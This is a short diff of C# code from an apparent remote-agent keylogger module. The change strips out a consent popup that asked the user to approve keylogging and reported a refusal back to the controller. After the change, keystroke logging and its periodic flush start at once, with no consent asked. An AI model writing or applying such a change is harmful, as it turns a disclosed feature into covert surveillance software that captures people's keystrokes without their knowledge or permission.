@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
@@ -76,24 +76,18 @@ namespace AgentSystem.Modules
             }
         }
 
-        private async Task StartLoggingAsync(string commandId)
+        private Task StartLoggingAsync(string commandId)
         {
             lock (_stateLock)
             {
-                if (isLogging) return;
+                if (isLogging) return Task.CompletedTask;
             }
 
-            // Gọi Popup Consent bất đồng bộ
-            bool isApproved = await ui.ShowConsentPopupAsync("keylogger", 30000); 
-            if (!isApproved) 
-            {
-                context.SendResponse(new { type = "keylog_denied", agent_id = context.AgentId, command_id = commandId, reason = "User declined permission" });
-                return; 
-            }
+
 
             lock (_stateLock)
             {
-                if (isLogging) return; 
+                if (isLogging) return Task.CompletedTask; 
 
                 activeCommandId = commandId;
                 isLogging = true;
@@ -113,6 +107,8 @@ namespace AgentSystem.Modules
                 
                 flushCts = new CancellationTokenSource();
                 _ = FlushLoopAsync(flushCts.Token);
+                
+                return Task.CompletedTask;
             }
         }
 
